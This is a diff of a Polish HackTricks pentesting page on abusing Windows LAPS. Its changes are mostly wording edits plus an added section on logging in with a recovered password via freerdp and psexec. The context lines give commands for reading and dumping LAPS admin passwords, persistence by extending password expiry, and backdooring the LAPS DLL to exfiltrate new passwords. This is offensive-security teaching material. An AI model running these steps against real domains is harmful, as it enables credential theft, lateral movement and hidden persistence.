@@ -41,7 +41,7 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS Password Access
 
-Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na format czytelny dla człowieka.
+Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik na format czytelny dla ludzi.
 
 Ponadto, **natywne cmdlety PowerShell LAPS** mogą być używane, jeśli są zainstalowane na maszynie, do której mamy dostęp:
 ```powershell
@@ -64,7 +64,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-**PowerView** może być również używany do ustalenia **kto może odczytać hasło i je odczytać**:
+**PowerView** może być również użyty do ustalenia **kto może odczytać hasło i je odczytać**:
 ```powershell
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
@@ -107,11 +107,19 @@ crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
 To będzie zrzut wszystkich haseł, które użytkownik może odczytać, co pozwoli ci uzyskać lepszą pozycję z innym użytkownikiem.
 
-## **LAPS Utrzymywanie**
+## ** Używanie hasła LAPS **
+```
+freerdp /v:192.168.1.1:3389  /u:Administrator
+Password: 2Z@Ae)7!{9#Cq
+
+python psexec.py Administrator@web.example.com
+Password: 2Z@Ae)7!{9#Cq
+```
+## **LAPS Persistence**
 
 ### **Data wygaśnięcia**
 
-Będąc administratorem, możliwe jest **uzyskanie haseł** i **zapobieganie** maszynie w **aktualizacji** swojego **hasła** poprzez **ustawienie daty wygaśnięcia w przyszłość**.
+Po uzyskaniu uprawnień administratora, możliwe jest **uzyskanie haseł** i **zapobieżenie** maszynie w **aktualizacji** swojego **hasła** poprzez **ustawienie daty wygaśnięcia w przyszłość**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -126,7 +134,7 @@ Hasło nadal zostanie zresetowane, jeśli **administrator** użyje polecenia **`
 
 ### Backdoor
 
-Oryginalny kod źródłowy dla LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdoora w kodzie (w metodzie `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`, na przykład), który w jakiś sposób **wyeksfiltruje nowe hasła lub przechowa je gdzie indziej**.
+Oryginalny kod źródłowy dla LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdoora w kodzie (w metodzie `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`, na przykład), który w jakiś sposób **wyeksfiltruje nowe hasła lub przechowa je gdzieś**.
 
 Następnie wystarczy skompilować nowy `AdmPwd.PS.dll` i przesłać go na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i zmienić czas modyfikacji).
 
@@ -147,7 +155,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
+* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.
 
 </details>
 {% endhint %}
